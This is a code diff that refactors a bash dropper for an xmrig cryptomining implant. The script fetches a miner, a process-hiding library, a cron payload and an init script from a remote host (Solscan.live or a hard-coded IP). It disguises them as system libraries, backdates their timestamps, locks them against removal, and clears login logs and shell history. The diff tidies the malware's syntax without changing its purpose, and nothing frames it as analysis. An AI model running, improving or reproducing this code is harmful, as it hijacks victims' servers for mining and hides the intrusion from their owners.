@@ -1,154 +1,161 @@
 #!/bin/bash
 
-pwd=pwd
+pwd=$(pwd)
 
-if [[ getconf LONG_BIT == 32 ]]; then
-echo -e "[\033[0;32mInfo\033[0m] 32-bit system, exiting!"
-rm -f $pwd/1.sh
-echo > /var/log/wtmp
-echo > /var/log/btmp
-echo > /var/log/messages
-echo > ~/.bash_history
-history -c
-exit
+# Check for 32-bit systems
+if [[ $(getconf LONG_BIT) == 32 ]]; then
+    echo -e "[\033[0;32mInfo\033[0m] 32位系统，退出！"
+    rm -f "$pwd"/1.sh
+    : > /var/log/wtmp
+    : > /var/log/btmp
+    : > /var/log/messages
+    : > ~/.bash_history
+    history -c
+    exit
 fi
 
-if grep -Eqii "CentOS" /etc/issue || grep -Eq "CentOS" /etc/*-release; then
-DISTRO='CentOS'
-TYPE='yum'
-pdflushType='launch'
+# Identify the Linux distribution
+if grep -Eqi "CentOS" /etc/issue || grep -Eq "CentOS" /etc/*-release; then
+    DISTRO='CentOS'
+    TYPE='yum'
+    pdflushType='launch'
 elif grep -Eqi "Red Hat Enterprise Linux Server" /etc/issue || grep -Eq "Red Hat Enterprise Linux Server" /etc/*-release; then
-DISTRO='RHEL'
-TYPE='yum'
-pdflushType='launch'
+    DISTRO='RHEL'
+    TYPE='yum'
+    pdflushType='launch'
 elif grep -Eqi "Debian" /etc/issue || grep -Eq "Debian" /etc/*-release; then
-DISTRO='Debian'
-TYPE='apt'
-pdflushType='launch-ubuntu'
+    DISTRO='Debian'
+    TYPE='apt'
+    pdflushType='launch-ubuntu'
 elif grep -Eqi "Ubuntu" /etc/issue || grep -Eq "Ubuntu" /etc/*-release; then
-DISTRO='Ubuntu'
-TYPE='apt'
-pdflushType='launch-ubuntu'
+ export DISTRO='Ubuntu'
+    TYPE='apt'
+    pdflushType='launch-ubuntu'
 elif grep -Eqi "SUSE" /etc/issue || grep -Eq "SUSE" /etc/*-release; then
-DISTRO='SUSE'
-TYPE='zypper'
-pdflushType='launch'
+  export DISTRO='SUSE'
+  export  TYPE='zypper'
+    pdflushType='launch'
 else
-echo "Unsupported system!"
-exit
+    echo "不支持的系统!"
+    exit
 fi
 
-tmepIp=$busybox ping Solscan.live -c1 | $busybox sed '1{s/[^(]*(//;s/).*//;q}'
+# Get the IP address
+tmepIp=$(busybox ping Solscan.live -c1 | busybox sed '1{s/[^(]*(//;s/).*//;q}')
 if [[ $tmepIp == "127.0.0.1" ]]; then
-remoteIp=188.121.119.155
+    remoteIp=188.121.119.155
 elif [[ $tmepIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
-FIELD1=$(echo $tmepIp | cut -d. -f1)
-FIELD2=$(echo $tmepIp | cut -d. -f2)
-FIELD3=$(echo $tmepIp | cut -d. -f3)
-FIELD4=$(echo $tmepIp | cut -d. -f4)
-if [ $FIELD1 -le 255 -a $FIELD2 -le 255 -a $FIELD3 -le 255 -a $FIELD4 -le 255 ]; then
-remoteIp=$tmepIp
-else
-remoteIp=188.121.119.155
-fi
+    FIELD1=$(echo "$tmepIp" | cut -d. -f1)
+    FIELD2=$(echo "$tmepIp" | cut -d. -f2)
+    FIELD3=$(echo "$tmepIp" | cut -d. -f3)
+    FIELD4=$(echo "$tmepIp" | cut -d. -f4)
+    if [[ "$FIELD1" -le 255 ]] && [[ "$FIELD2" -le 255 ]] && [[ "$FIELD3" -le 255 ]] && [[ "$FIELD4" -le 255 ]]; then
+        remoteIp=$tmepIp
+    else
+        remoteIp=188.121.119.155
+    fi
 fi
 
+# Check and download necessary files
 if [[ ! -f /lib64/libg++.so ]]; then
-wget http://$remoteIp/xmrig/chattr
-mv chattr /lib64/libg++.so
-chmod a+x /lib64/libg++.so
-/lib64/libg++.so +ai /lib64/libg++.so
+    wget http://"$remoteIp"/xmrig/chattr
+    mv chattr /lib64/libg++.so
+    chmod a+x /lib64/libg++.so
+    /lib64/libg++.so +ai /lib64/libg++.so
 fi
 
-chattr="/lib64/libg++.so"
+export chattr="/lib64/libg++.so"
 busybox="/lib64/busybox"
 
-# Legacy detection
+# Check and update files
 if [[ -f $busybox ]]; then
-echo -e "[\033[0;32mInfo\033[0m] Already installed, checking for update"
-launch="/etc/init.d/pdflushs"
-xmrig="/usr/bin/kthreadds"
-cron="/lib64/libgc++.so"
-processhider="/lib64/libstdc++.so"
-sha512Busybox="89dafd4be9d51135ec8ad78a9ac24c29f47673a9fb3920dac9df81c7b6b850ad8e7219a0ded755c2b106a736804c9de3174302a2fba6130196919777cb516a4f"
-echo -e "[\033[0;32mInfo\033[0m] Starting check for busybox"
-if [[ sha512sum $busybox | awk '{print $1}' != $sha512Busybox ]]; then
-echo -e "[\033[0;31mWarning\033[0m] Busybox is invalid!"
-exit
-fi
+    echo -e "[\033[0;32mInfo\033[0m] Already installed, checking for updates"
+    launch="/etc/init.d/pdflushs"
+    xmrig="/usr/bin/kthreadds"
+    cron="/lib64/libgc++.so"
+    processhider="/lib64/libstdc++.so"
+    sha512Busybox="89dafd4be9d51135ec8ad78a9ac24c29f47673a9fb3920dac9df81c7b6b850ad8e7219a0ded755c2b106a736804c9de3174302a2fba6130196919777cb516a4f"
+    echo -e "[\033[0;32mInfo\033[0m] Starting check for busybox"
 
-tmepIp=$busybox ping solscan.live -c1 | $busybox sed '1{s/[^(]*(//;s/).*//;q}'
-if [[ $tmepIp == "127.0.0.1" ]]; then
-remoteIp=188.121.119.155
-elif [[ $tmepIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
-FIELD1=$(echo $tmepIp | cut -d. -f1)
-FIELD2=$(echo $tmepIp | cut -d. -f2)
-FIELD3=$(echo $tmepIp | cut -d. -f3)
-FIELD4=$(echo $tmepIp | cut -d. -f4)
-if [ $FIELD1 -le 255 -a $FIELD2 -le 255 -a $FIELD3 -le 255 -a $FIELD4 -le 255 ]; then
-remoteIp=$tmepIp
+    if [[ $(sha512sum "$busybox" | awk '{print $1}') != "$sha512Busybox" ]]; then
+        echo -e "[\033[0;31mWarning\033[0m] Busybox is invalid!"
+        exit
+    fi
+
+    tmepIp=$(busybox ping Solscan.live -c1 | busybox sed '1{s/[^(]*(//;s/).*//;q}')
+    if [[ $tmepIp == "127.0.0.1" ]]; then
+        remoteIp=188.121.119.155
+    elif [[ $tmepIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+        FIELD1=$(echo "$tmepIp" | cut -d. -f1)
+        FIELD2=$(echo "$tmepIp" | cut -d. -f2)
+        FIELD3=$(echo "$tmepIp" | cut -d. -f3)
+        FIELD4=$(echo "$tmepIp" | cut -d. -f4)
+        if [[ "$FIELD1" -le 255 ]] && [[ "$FIELD2" -le 255 ]] && [[ "$FIELD3" -le 255 ]] && [[ "$FIELD4" -le 255 ]]; then
+            remoteIp=$tmepIp
+        else
+            remoteIp=188.121.119.155
+        fi
+    fi
+
+    remoteXmrigSha512=$(busybox wget http://"$remoteIp"/sha512/xmrig -O - -q)
+    remotePdflushsSha512=$(busybox wget http://"$remoteIp"/sha512/$pdflushType -O - -q)
+    remoteProcesshiderSha512=$(busybox wget http://"$remoteIp"/sha512/processhider -O - -q)
+    remoteCronSha512=$(busybox wget http://"$remoteIp"/sha512/cron -O - -q)
+    localXmrigSha512=$(busybox sha512sum $xmrig | busybox awk '{print $1}')
+    localPdflushsSha512=$(busybox sha512sum $launch | busybox awk '{print $1}')
+    localProcesshiderSha512=$(busybox sha512sum $processhider | busybox awk '{print $1}')
+    localCronSha512=$(busybox sha512sum $cron | busybox awk '{print $1}')
+
+    echo -e "[\033[0;32mInfo\033[0m] Starting check for xmrig"
+    if [[ $remoteXmrigSha512 != "$localXmrigSha512" ]]; then
+        busybox chattr -iaR /usr/bin/
+        busybox rm -f $xmrig
+        busybox killall kthreadds
+        busybox wget http://"$remoteIp"/xmrig/xmrig -O $xmrig
+        timeFile=$(busybox find /usr/bin -type f -printf '%T+ %p\n' | sort -r | head -1 | awk '{print $2}')
+        busybox touch -r "$timeFile" $xmrig
+        busybox chmod a+x $xmrig
+        busybox chattr +ai $xmrig
+    fi
+
+    echo -e "[\033[0;32mInfo\033[0m] Starting check for lib"
+    if [[ $remoteProcesshiderSha512 != "$localProcesshiderSha512" ]]; then
+        busybox chattr -iaR /lib64/
+        busybox rm -f $processhider
+        busybox wget http://"$remoteIp"/xmrig/processhider.so -O $processhider
+        timeFile=$(busybox find /lib64 -type f -printf '%T+ %p\n' | sort -r | head -1 | awk '{print $2}')
+        busybox touch -r "$timeFile" $processhider
+        busybox chattr +ai $processhider
+    fi
+
+    echo -e "[\033[0;32mInfo\033[0m] Starting check for cron"
+    if [[ $remoteCronSha512 != "$localCronSha512" ]]; then
+        busybox kill -9 "$(busybox ps | busybox grep libgc++.so | busybox grep -v grep | busybox awk '{print $1}')"
+        busybox chattr -iaR /lib64/
+        busybox rm -f $cron
+        busybox wget http://"$remoteIp"/xmrig/cron.py -O $cron
+        timeFile=$(busybox find /lib64 -type f -printf '%T+ %p\n' | sort -r | head -1 | awk '{print $2}')
+        busybox touch -r "$timeFile" $cron
+        busybox chmod a+x $cron
+        busybox chattr +ai $cron
+    fi
+
+    echo -e "[\033[0;32mInfo\033[0m] Starting check for pdflush"
+    if [[ $remotePdflushsSha512 != "$localPdflushsSha512" ]]; then
+        busybox chattr -iaR /etc/init.d/
+        busybox rm -f $launch
+        busybox wget http://"$remoteIp"/xmrig/$pdflushType -O $launch
+        timeFile=$(busybox find /etc/init.d -type f -printf '%T+ %p\n' | sort -r | head -1 | awk '{print $2}')
+        busybox touch -r "$timeFile" $launch
+        busybox chmod a+x $launch
+        busybox chattr +ai $launch
+    fi
 else
-remoteIp=188.121.119.155
-fi
-fi
-
-remoteXmrigSha512=$busybox wget http://$remoteIp/sha512/xmrig -O - -q
-remotePdflushsSha512=$busybox wget http://$remoteIp/sha512/$pdflushType -O - -q
-remoteProcesshiderSha512=$busybox wget http://$remoteIp/sha512/processhider -O - -q
-remoteCronSha512=$busybox wget http://$remoteIp/sha512/cron -O - -q
-localXmrigSha512=$busybox sha512sum $xmrig | $busybox awk '{print $1}'
-localPdflushsSha512=$busybox sha512sum $launch | $busybox awk '{print $1}'
-localProcesshiderSha512=$busybox sha512sum $processhider | $busybox awk '{print $1}'
-localCronSha512=$busybox sha512sum $cron | $busybox awk '{print $1}'
-
-echo -e "[\033[0;32mInfo\033[0m] Starting check for xmrig"
-if [[ $remoteXmrigSha512 != $localXmrigSha512 ]]; then
-$busybox chattr -iaR /usr/bin/
-$busybox rm -f $xmrig
-$busybox killall kthreadds
-$busybox wget http://$remoteIp/xmrig/xmrig -O $xmrig
-timeFile=$busybox ls -t /usr/bin | $busybox tail -1
-$busybox touch -r /usr/bin/$timeFile $xmrig
-$busybox chmod a+x $xmrig
-$busybox chattr +ai $xmrig
-fi
-
-echo -e "[\033[0;32mInfo\033[0m] Starting check for lib"
-if [[ $remoteProcesshiderSha512 != $localProcesshiderSha512 ]]; then
-$busybox chattr -iaR /lib64/
-$busybox rm -f $processhider
-$busybox wget http://$remoteIp/xmrig/processhider.so -O $processhider
-timeFile=$busybox ls -t /lib64 | $busybox tail -1
-$busybox touch -r /lib64/$timeFile $processhider
-$busybox chattr +ai $processhider
-fi
-
-echo -e "[\033[0;32mInfo\033[0m] Starting check for cron"
-if [[ $remoteCronSha512 != $localCronSha512 ]]; then
-$busybox kill -9 $busybox ps | $busybox grep libgc++.so | $busybox grep -v grep | $busybox awk '{print $1}'
-$busybox chattr -iaR /lib64/
-$busybox rm -f $cron
-$busybox wget http://$remoteIp/xmrig/cron.py -O $cron
-timeFile=$busybox ls -t /lib64 | $busybox tail -1
-$busybox touch -r /lib64/$timeFile $cron
-$busybox chmod a+x $cron
-$busybox chattr +ai $cron
-fi
-
-echo -e "[\033[0;32mInfo\033[0m] Starting check for launch"
-if [[ $remotePdflushsSha512 != $localPdflushsSha512 ]]; then
-$busybox kill -9 $busybox ps | $busybox grep kthreadds | $busybox grep -v grep | $busybox awk '{print $1}'
-$busybox chattr -aiR /etc/init.d/
-$busybox rm -f $launch
-if [[ $DISTRO == 'Ubuntu' || $DISTRO == 'Debian' ]]; then
-$busybox wget http://$remoteIp/xmrig/cron.py -O $launch
-else
-$busybox wget http://$remoteIp/xmrig/pdflushs -O $launch
-fi
-timeFile=$busybox ls -t /etc/init.d | $busybox tail -1
-$busybox touch -r /etc/init.d/$timeFile $launch
-$busybox chmod a+x $launch
-$busybox chattr +ai $launch
-$busybox chattr +i $launch
-fi
+    echo -e "[\033[0;32mInfo\033[0m] Starting installation of busybox"
+    busybox wget http://"$remoteIp"/xmrig/busybox -O $busybox
+    busybox chmod a+x $busybox
+    $busybox --install -s /bin
+    $busybox --install -s /sbin
+    $busybox --install -s /usr/bin
+    $busybox --install -s /usr/sbin
 fi
